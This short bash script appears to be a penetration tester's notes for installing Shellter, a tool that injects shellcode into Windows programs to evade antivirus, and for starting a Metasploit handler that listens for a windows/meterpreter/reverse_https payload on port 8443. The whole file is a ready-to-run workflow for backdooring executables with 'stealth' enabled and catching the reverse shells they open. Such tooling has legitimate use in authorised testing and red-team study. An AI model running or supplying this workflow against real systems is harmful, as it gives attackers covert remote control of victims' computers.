#!/bin/bash


# Install the Debian package (v4)
apt-get install shellter


# Or get the latest version, but run it using wine (v5.2+)
cd /tmp
wget https://www.shellterproject.com/Downloads/Shellter/Latest/shellter.zip -U "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36" -O shellter.zip
unzip shellter.zip
mv shellter /opt/shellter
cd /opt/shellter
wineconsole shellter.exe

# Mode 'a' for Auto

file="/opt/pentest/msf/listener-shellter-8443.rc"
cat << EOF > "${file}"
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set exitfunc thread
set LHOST 0.0.0.0
set LPORT 8443
exploit -j
EOF



# Stealth? yes

# Select the same payload (3)

# From msf, exploit

sleep 3
msfconsole -r "${file}"
